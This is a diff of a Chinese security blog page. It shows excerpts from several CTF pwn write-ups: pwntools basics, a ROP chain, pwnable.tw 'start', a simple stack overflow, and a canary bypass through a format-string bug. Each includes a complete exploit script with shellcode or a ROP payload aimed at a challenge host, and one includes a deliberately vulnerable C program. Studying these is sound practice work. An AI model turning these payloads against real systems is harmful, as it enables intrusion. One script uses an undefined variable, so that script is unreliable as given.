@@ -6,11 +6,11 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
 <meta property="og:locale" content="zh">
 <meta name="twitter:card" content="summary">
@@ -148,232 +148,595 @@
           <div id="js-content" class="content-ll">
             
   
-  
+    <article id="post-PWN/Pythonpwn使用方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Pythonpwn使用方法</p>
+<h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a><strong>Pythonpwn使用方法</strong></h3><h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from  pwn  import  *  #导入pwn</p>
+<p>#remote建立远程连接，需要参数(ip,port)</p>
+<p>#如果本地执行的话:</p>
+<p>#p = process(‘./pilot’)<br>p  =  remote(“106.2.25.7”,8003)<br>p.recvuntil(‘Location:’)  #接收信息直到出现关键字’Location’<br>addr  =  int  (p.recvuntil(‘\n’)[0:14],16)  #将之后接收到的信息的14位16进制数转成int存储起来<br>print  addr</p>
+<p>shellcode  =  ‘\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05’</p>
+<p>#布局<br>payload  =  shellcode  +  ((40  -  len(shellcode))*’A’)  +  p64(addr)</p>
+<p>#接收信息直到出现关键字’Command:’<br>p.recvuntil(‘Command:’)</p>
+<p>#将payload发送出去</p>
+<p>#p.sendline()发送之后默认在后面加换行</p>
+<p>#p.sendline(payload)<br>p.send(payload+’\n’)</p>
+<p>#与其进行交互<br>p.interactive()</p>
+<p>‘’’<br>利用思路：cyclic 100计算溢出偏移长度,Location定位字符串开始的位置,布局为 shellcode+padding+addr<br>执行到返回,劫持返回地址到addr,addr指向Location,即字符串开始的位置,之后执行shellcode,拿到shell<br>‘’’</p>
+<p>#cat home/flag</p>
+<h4 id="shellcode生成操作-汇编转操作码-："><a href="#shellcode生成操作-汇编转操作码-：" class="headerlink" title="shellcode生成操作(汇编转操作码)："></a><strong>shellcode生成操作(汇编转操作码)：</strong></h4><p>以<strong>实验吧</strong>  <strong>加减乘除</strong>为例：<br><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/0de3cdb6d972dfb8fbc88e35fc4d36e0.png" alt><br>代码如下：</p>
+<h1 id="coding-utf-8-1"><a href="#coding-utf-8-1" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>from  pwn  import  *</p>
+<p>code  =  ‘’’.global _start<br>_start:<br>jmp test1<br>test2:<br>pop ebx<br>mov al, 0xa<br>int 0x80<br>mov al, 0x1<br>xor ebx, ebx<br>int 0x80<br>test1:<br>call test2<br>.string “delfile” ‘’’</p>
+<p>#设置环境<br>‘’’<br>arch设置架构为x86<br>os设置系统为linux<br>endian设置大小端模式为小端<br>word_size设置字长为32<br>log_level设置日志输出等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便<br>‘’’</p>
+<p>context(arch  =  ‘x86’,  os  =  ‘linux’,  endian  =  ‘little’,  word_size  =  32,  log_level  =  ‘debug’)</p>
+<p>#将code编码输出<br>shellcode  =  asm(code).encode(‘hex’)<br>print  shellcode<br>print  type(shellcode)</p>
+<p>#格式化，加上’\x’<br>r  =  ‘’<br>count  =  0<br>for  i  in  shellcode:<br>    if  count  %  2  ==  0:<br>        r  +=  r’\x’<br>    r  +=  i<br>    count  +=  1<br>print  r<br>运行结果如下：<br><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/9075b03109db06effc5021ad08269d07.png" alt><br>注意删掉<strong>\x00坏字符</strong>，提交拿到key值：<br><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/1838d70fb3f9614721dd4efe9551c916.png" alt></p>
+<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><strong>其他：</strong></h4><h5 id="在寻找溢出长度时："><a href="#在寻找溢出长度时：" class="headerlink" title="在寻找溢出长度时："></a><strong>在寻找溢出长度时：</strong></h5><p>#生成指定长度的不重复序列</p>
+<p>#cyclic 100</p>
+<p>#用于查找指定序列的偏移量</p>
+<p>#cyclic -l gaaa<br>使用截图如下：<br><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/1368de3c660aae209011eb00e1f46bb2.png" alt></p>
+<h5 id="ELF文件操作："><a href="#ELF文件操作：" class="headerlink" title="ELF文件操作："></a><strong>ELF文件操作：</strong></h5><p>#获得该ELF的句柄</p>
+<p>#libc = ELF(“/lib/x86_64-linux-gnu/libgcc_s.so.1”);</p>
+<p>#将jmp esp对应的汇编代码送给jmp_esp</p>
+<p>#jmp_esp = asm(“jmp esp”)</p>
+<p>#在libc中搜索对应的汇编代码，并将为该汇编代码的地址返回给jmp_eso_addr_offset</p>
+<p>#jmp_esp_addr_offset=libc.search(jmp_esp).next()</p>
+<h5 id="自动生成shellcode"><a href="#自动生成shellcode" class="headerlink" title="自动生成shellcode"></a><strong>自动生成shellcode</strong></h5><p><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/09c4c9f5be43b6c0fefa5ce448f06a4d.png" alt></p>
+<h5 id="数据打包："><a href="#数据打包：" class="headerlink" title="数据打包："></a><strong>数据打包：</strong></h5><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便<br>用法：</p>
+<ul>
+<li>p32/p64: 打包一个整数,分别打包为32或64位</li>
+<li>u32/u64: 解包一个字符串,得到整数</li>
+</ul>
+<p>使用截图如下：<br><img src="/2019/09/10/PWN/Pythonpwn使用方法/_resources/1c01dec99118cee6ee97d2eba68d2546.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Reverse/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/Pythonpwn使用方法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.693Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/ROP (Return-oriented programming ) 返回导向编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ROP (Return-oriented programming ) 返回导向编程</p>
+<h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a><strong>ROP (Return-oriented programming ) 返回导向编程</strong></h3><p>以<strong>实验吧 ropbaby</strong>为例：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d514bf7df4e170521042293fdc69e3d7.png" alt><br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/79671673cb3dbdc18b17630713a6fa10.png" alt></p>
+<p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
+<p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
+<p>首先<strong>寻找溢出点</strong>：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/ee6566df7256098be4ab03686b8a9c8a.png" alt><br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/bc4a38b47b5fb2858aa7c89ae1d80697.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/c8dbb3b018a921c371b140115253b52f.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/09c4d08f7fb7e50ef331935c777cf403.png" alt><br>偏移量为8<br>验证如下：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d9ce806250e3ab925ac3fbba9336c63a.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/2f1da7027901200e157d3edb9908815f.png" alt><br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/5a73527385c79cd9bcbd0bc832ebaa92.png" alt><br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/b476dafead58d72a02f5a03b4ad48d63.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d7c675fffc61a43ce0238648eb20d885.png" alt></p>
+<p><strong>注意：</strong>64位参数先以寄存器为主，分别是rdi,rsi,rdx,rcx,r8,r9,栈；32位只有栈。该程序是64位，之后的system(‘/bin/sh’)只有一个参数，入rdi寄存器，所以找相应的指令:pop rdi;ret;</p>
+<p><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/cdc3b8cb24f2db99e422c98cba4c2cd4.png" alt><br>那么offset_rdi_ret = 0x21102<br><strong>拿到offset_system</strong><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/638d973dde12d491bf623f5a33a56383.png" alt><br>利用2可以拿到addr_system，然后addr_libc就可以计算出来了。</p>
+<p><strong>exp如下：</strong><br>from  pwn  import  *</p>
+<p>def  pwn():<br>    s  =  remote(“106.2.25.7”,  8004)<br>    print  ‘[<em>] Start!’<br>    s.recvuntil(‘:’)<br>    #Get addr_system<br>    s.sendline(‘2’)<br>    s.recvuntil(‘Enter symbol: ‘)<br>    s.sendline(‘system’)<br>    addr_system  =  int  (s.recvuntil(‘\n’)[14:],16)<br>    print  ‘[</em>] addr_system is ‘,addr_system<br>    offset_system  =  0x45390<br>    #Calculate addr_libc<br>    addr_libc  =  addr_system  -  offset_system<br>    #Make payload<br>    s.sendline(‘3’)<br>    s.recvuntil(‘(max 1024): ‘)<br>    #8 + 8 + 8 + 8 =32<br>    s.sendline(‘32’)<br>    offset_binsh  =  0x18cd17<br>    offset_rdi_ret  =  0x21102<br>    addr_rdi_ret  =  addr_libc  +  offset_rdi_ret<br>    addr_binsh  =  addr_libc  +  offset_binsh<br><br>    payload  =’A’  *  8  +  p64(addr_rdi_ret)  +  p64(addr_binsh)  +  p64(addr_system)<br><br>    s.sendline(payload)<br>    s.interactive()</p>
+<p>def  main():<br>    pwn()</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()<br><strong>运行结果如下：</strong><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/af92467f178d1d29a856801aace8c2ef.png" alt="1534153380698.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/Pwnable.tw.start" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Pwnable.tw.start</p>
+<h3 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw.start"></a><strong>Pwnable.tw.start</strong></h3><h4 id="拿到题目"><a href="#拿到题目" class="headerlink" title="拿到题目"></a><strong>拿到题目</strong></h4><p>32位，小端，静态编译，保护全关<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/42f00637996ec6ee010976e734bb4f3e.png" alt></p>
+<h4 id="运行一下"><a href="#运行一下" class="headerlink" title="运行一下"></a><strong>运行一下</strong></h4><p>输入超长字符串，程序Crash掉<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/9e8d630428e96afb7333aa69a7847980.png" alt></p>
+<h4 id="拖入IDA"><a href="#拖入IDA" class="headerlink" title="拖入IDA"></a><strong>拖入IDA</strong></h4><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/0adf2605788cc8aceeb99dd3c410b539.png" alt><br>start函数里，先write出“Let’s start the CTF:”,之后输入。<br>因为对write和read对栈的影响不太熟悉,所以gdb调试一下。<br>第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。edx存放字符串长度，ebx存放fd。<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/947c25798c9158f4a7533ff905f441fb.png" alt><br>第二次int 80h后，从ecx拿到字符串的地址，并在此写值。<br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/8f1c0aa058a5b5bf1d2cd1c39b6e7e9c.png" alt></p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h4><p>控制ret，指到我需要的地方，但是栈指针不知道，所以想办法先泄露出栈上的一个指针。注意到start在运行时，先push了esp和exit的地址，在ret后，之前push进去的esp就成了现在esp的值，那么可以利用write拿到之前push的esp，这样，我们就拿到了一个栈上的指针。</p>
+<p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/4a61f97daea2591b6059e02cb244d0fc.png" alt><br>之后，就是正常的利用思路。<br>payload = ‘A’ * offset + shellcode_addr + shellcode</p>
+<h5 id="计算溢出偏移量"><a href="#计算溢出偏移量" class="headerlink" title="计算溢出偏移量"></a><strong>计算溢出偏移量</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/1be6e5cebcdaf7728080f71f0683a225.png" alt><br>溢出偏移量 offset = 20</p>
+<h5 id="计算shellcode-addr"><a href="#计算shellcode-addr" class="headerlink" title="计算shellcode_addr"></a><strong>计算shellcode_addr</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/77973a48820fee86086be01a0ea6ba9f.png" alt></p>
+<p>那么泄露出来的 esp:0xffffd430与shellcode_addr:0xffffd444的差值为0x14。其实，计算方法也可以是：之前push的esp与push后产生的新esp差值为4，那么新的esp就等于泄露出来的esp(旧的esp) - 4，所以shellcode_addr = 泄露出来的值 - 4 + 0x14 + 4(ret) = 泄露出来的值 + 0x14</p>
+<h5 id="书写shellcode"><a href="#书写shellcode" class="headerlink" title="书写shellcode"></a><strong>书写shellcode</strong></h5><p>code  =  ‘’’<br>xor ecx,ecx<br>mul ecx<br>push eax<br>push 0x68732F2F<br>push 0x6E69622F<br>mov ebx,esp<br>mov al,0x0B<br>int 0x80<br>‘’’</p>
+<p>context(arch  =  ‘i386’,  os  =  ‘linux’,  endian  =  ‘little’,  wordsize  =  32)</p>
+<p>shellcode  =  asm(code).encode(‘hex’)<br>print  ‘[*] shellcode is %s ‘  %  shellcode<br>xor ecx,ecx与mul ecx 很巧妙，mul ecx将edx与eax同时置0</p>
+<h4 id="完整的exp如下"><a href="#完整的exp如下" class="headerlink" title="完整的exp如下"></a><strong>完整的exp如下</strong></h4><p>from  pwn  import  *<br>import  binascii</p>
+<p>def  makeShellcode():<br>    code  =’’’<br>    xor ecx,ecx<br>    mul ecx<br>    push eax<br>    push 0x68732F2F<br>    push 0x6E69622F<br>    mov ebx,esp<br>    mov al,0x0B<br>    int 0x80<br>    ‘’’</p>
+<pre><code>context(arch  =  &apos;x86&apos;,os  =  &apos;linux&apos;,  endian  =  &apos;little&apos;  ,  word_size  =  32)
+
+shellcode  =  asm(code).encode(&apos;hex&apos;)
+print  &apos;[*] shellcode is %s&apos;  %  shellcode
+return  shellcode</code></pre><p>def  pwnable_tw_start():<br>    s  =  remote(‘chall.pwnable.tw’,10000)<br>    s.recvuntil(‘Let&#39;s start the CTF:’)<br>    #leak Oldesp and calculate shellcode_addr<br>    s.send(‘A’  *  20  +  p32(0x08048087))<br>    Oldesp  =  u32(s.recv(4))<br>    shellcode_addr  =  Oldesp  +  0x14<br>    print  ‘[*] shellcode_addr is %s’  %  hex(shellcode_addr)<br>    #Get shell<br>    shellcode  =  makeShellcode()<br>    payload  =  ‘A’  *  20  +  p32(shellcode_addr)+binascii.a2b_hex(shellcode)<br>    s.send(payload)<br>    s.interactive()</p>
+<p>def  main():<br>    pwnable_tw_start()</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()</p>
+<p>#FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}</p>
+<h5 id="运行结果如图："><a href="#运行结果如图：" class="headerlink" title="运行结果如图："></a><strong>运行结果如图：</strong></h5><p><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/a932583c9a566cb25c62ffa7ec11f282.png" alt></p>
+<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h4><p>系统调用表：<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a><br><img src="/2019/09/10/PWN/Pwnable.tw.start/_resources/4c55e1f5766990deff0c14d19bc2528d.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/Pwnable.tw.start/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.660Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/简单栈溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>简单栈溢出</p>
+<h3 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a><strong>简单栈溢出</strong></h3><p>ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）<br>溢出点不在他让你overflow的地方，在handler函数里<br><img src="/2019/09/10/PWN/简单栈溢出/_resources/cf05965825972578816647552cdc2851.png" alt><br>在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell<br>偏移量为 0x110 - 0x108 = 8<br>那么构造payload为 ‘a’ * 8 +’/bin/sh’<br>脚本如下：<br>from  pwn  import  *</p>
+<p>def  pwn():<br>    s  =  remote(‘202.120.7.206’,  60010)<br>    s.recvuntil(‘name:’)<br>    s.sendline(‘aaaa’)<br>    s.recvuntil(‘Overflow me’)<br>    s.sendline(‘b’  *  50)<br>    s.recvuntil(‘[N]’)<br>    s.sendline(‘a’  *  8  +  ‘/bin/sh’)<br>    s.interactive()</p>
+<p>def  main():<br>    pwn()</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()</p>
+<p>运行结果如图<br><img src="/2019/09/10/PWN/简单栈溢出/_resources/78421ec1a7f37ffb413a989314d3463f.png" alt="1535687009338.png"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/简单栈溢出/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.643Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PWN/Canary绕过(格式化字符串利用)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Canary绕过(格式化字符串利用)</p>
+<h2 id="Canary绕过-格式化字符串利用"><a href="#Canary绕过-格式化字符串利用" class="headerlink" title="Canary绕过(格式化字符串利用)"></a><strong>Canary绕过(格式化字符串利用)</strong></h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a><strong>漏洞代码:</strong></h3><p>#include &lt;stdio.h&gt;</p>
+<p>#include &lt;unistd.h&gt;</p>
+<p>#include &lt;string.h&gt;<br>void  getshell(void) {<br>system(“/bin/sh”);<br>}<br>void  init() {<br>setbuf(stdin,  NULL);<br>setbuf(stdout,  NULL);<br>setbuf(stderr,  NULL);<br>}<br>int  main(void) {<br>int  i;<br>init();<br>char  buf[100];<br>for(int  i=0;i&lt;2;i++){<br>scanf(“%s”,&amp;buf);<br>printf(buf);  //vul<br>}<br>return  0;<br>}</p>
+<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>利用格式化字符串漏洞泄露出canary的值，利用main函数的ret拿到shell</p>
+<h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a><strong>具体实现：</strong></h3><h4 id="找到canary的位置："><a href="#找到canary的位置：" class="headerlink" title="找到canary的位置："></a><strong>找到canary的位置：</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/183de8fcd52b9b29d4fd53fa7fd67590.png" alt><br>在进入main函数后将canary的值储存在$ebp - 0xc的地方<img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/1f9ac97d03e5f8da123832a1faca2f84.png" alt></p>
+<h4 id="找到存储字符串的地址："><a href="#找到存储字符串的地址：" class="headerlink" title="找到存储字符串的地址："></a><strong>找到存储字符串的地址：</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png" alt></p>
+<h4 id="计算偏移："><a href="#计算偏移：" class="headerlink" title="计算偏移："></a><strong>计算偏移：</strong></h4><p>(0x37c - 0x304) / 4 = 30 所以canary在偏移31的地方</p>
+<h4 id="找到main函数的ret地址"><a href="#找到main函数的ret地址" class="headerlink" title="找到main函数的ret地址:"></a><strong>找到main函数的ret地址:</strong></h4><p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/a071431c124bace0697ab210d7b66ab0.png" alt><br>这段代码需要注意下：因为eip指向ret时，esp的值就是ret的地址。<br>那么代码的执行效果如下：<br>pop ecx后，ecx = 0xbffff3a0<br>pop ebx后，ebx = 0x0<br>pop ebp后，ebp = 0x0</p>
+<p>lea esp,[ecx-0x4]后，esp = *(ecx - 0x4) = *(0xbffff3a0 - 0x4) = *(0xbffff39c) = 0xb7df1e81</p>
+<p>如下：<br><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/b7b8e1c128f9b8f531aef4de99ec0186.png" alt><br>那么将下面的图补充完整：<br><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/f06e293b9d77341a1e5af0033b7df246.png" alt><br>0xbffff380存储了之后将要pop出的ecx的值<br>那么需要在这里伪造出getshell的地址 + 4，那么之后pop ecx, esp = *(&amp;getshell + 4 - 4) = getshell</p>
+<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><p>from  pwn  import  *</p>
+<p>s  =  process(‘./cannry’)<br>libc  =  ELF(‘./cannry’)</p>
+<p>#context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
+<p>#gdb.attach(proc.pidof(s)[0])<br>shell_addr  =  libc.symbols[‘getshell’]<br>payload  =  ‘%31$x,%x’<br>s.sendline(payload)<br>res  =  s.recv()<br>cannry_addr  =  int(res.split(‘,’)[0],16)<br>arr_addr  =  int(res.split(‘,’)[1],16)  +  4<br>print  ‘cannry_addr is : ‘  +  hex(cannry_addr)<br>print  ‘arr_addr is : ‘  +  hex(arr_addr)</p>
+<p>payload  =  p32(shell_addr)  +  ‘a’  *  96  +  p32(cannry_addr)  +  p32(arr_shell)</p>
+<p>print  ‘[*] payload is : ‘  +  payload<br>s.sendline(payload)<br>s.interactive()</p>
+<p><img src="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/_resources/75dbb4fe9594be97c4d081af6151fe72.png" alt></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/09/10/PWN/Canary绕过(格式化字符串利用)/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.627Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
